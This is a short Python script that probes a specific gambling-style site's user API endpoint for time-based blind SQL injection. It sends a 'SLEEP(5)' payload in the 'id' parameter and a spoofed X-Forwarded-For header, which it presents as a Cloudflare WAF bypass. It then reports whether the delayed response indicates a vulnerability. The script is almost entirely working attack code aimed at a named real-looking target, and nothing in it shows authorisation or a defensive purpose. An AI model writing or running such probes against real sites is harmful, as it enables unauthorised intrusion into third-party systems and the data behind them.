import requests

def test_runehall_sqli(target_url):
    """
    Specific SQLi vector for RuneHall based on detected parameters.
    Utilizes bypass techniques for Cloudflare WAF.
    """
    print(f"[*] Executing RuneHall-specific SQLi vector on {target_url}")
    
    # Example vector targeting common API endpoints
    payload = "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
    params = {'id': payload, 'type': 'premium'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'X-Forwarded-For': '127.0.0.1' # Simple bypass attempt
    }
    
    try:
        response = requests.get(target_url, params=params, headers=headers, timeout=10)
        if response.elapsed.total_seconds() >= 5:
            print("[+] Potential Time-Based SQLi detected on RuneHall!")
        else:
            print("[-] No immediate SQLi response detected.")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    test_runehall_sqli("https://runehall.com/api/v1/user")
